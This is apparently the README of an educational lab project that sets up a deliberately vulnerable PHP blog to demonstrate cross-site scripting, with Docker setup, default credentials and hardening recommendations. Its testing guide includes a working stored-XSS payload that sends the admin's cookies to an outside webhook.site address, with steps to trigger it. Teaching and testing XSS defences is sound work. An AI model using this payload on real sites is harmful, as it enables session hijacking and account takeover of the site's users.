TechBlog XSS Demo Project
========================

## Project Purpose and Description
This project demonstrates Cross-Site Scripting (XSS) vulnerabilities in a web application. It serves as an educational tool to understand how XSS attacks work and their potential impact on web security. The demo includes a vulnerable blog application where users can post comments that are not properly sanitized.

## Tech Stack
- Frontend: HTML, CSS, JavaScript 
- Backend: PHP
- Database: MySQL
- Web Server: Apache
- Containerization: Docker
- Database Management: PHPMyAdmin

## Setup Instructions

### Local Setup
1. Install XAMPP or LAMP stack
2. Start Apache and MySQL services
3. Create database 'techblog' in MySQL
4. Import database.sql file into techblog database
5. Place project files in htdocs/www directory
6. Access application at http://localhost/techblog

### Docker Setup
1. Install Docker and Docker Compose
2. Clone the project repository 
3. Navigate to project directory
4. Run: `docker-compose up -d`
5. Wait for containers to start

### Docker Configuration
- Web Server: http://localhost:9000
- PHPMyAdmin: http://localhost:9090
- MySQL Port: 3306

### Default Credentials
- MySQL Root: root/rootpassword
- PHPMyAdmin: root/rootpassword 
- Admin User: admin/admin123
- Demo User: user/password

## Project Structure
```
/
├── index.php           # Main blog page
├── login.php          # User authentication
├── admin.php          # Admin dashboard
├── post.php           # Create new posts
├── comment.php        # Comment submission
├── database.sql       # Database schema
├── docker-compose.yml # Docker configuration
├── Dockerfile         # Container setup
├── css/
│   └── style.css      # Application styling
├── js/
│   └── script.js      # Client-side scripts
└── includes/
    ├── config.php     # Database connection
    └── functions.php  # Helper functions
```

## Security Testing Guide

### XSS Attack Steps
1. Login as regular user (user/password)
2. Navigate to any blog post's comment section
3. Insert XSS payload in comment:
```javascript
<script>document.location='http://webhook.site/YOUR-ID?cookie='+document.cookie</script>
```
4. Login as admin to trigger payload
5. Check webhook.site for captured data

### Security Recommendations
1. Implement input validation
2. Enable output encoding
3. Configure Content Security Policy
4. Use HttpOnly cookies
5. Keep dependencies updated
6. Add security headers
7. Filter malicious input
8. Secure session management

### Expected Impact
Demonstrates how XSS vulnerabilities can lead to session hijacking and unauthorized admin access through cookie theft.
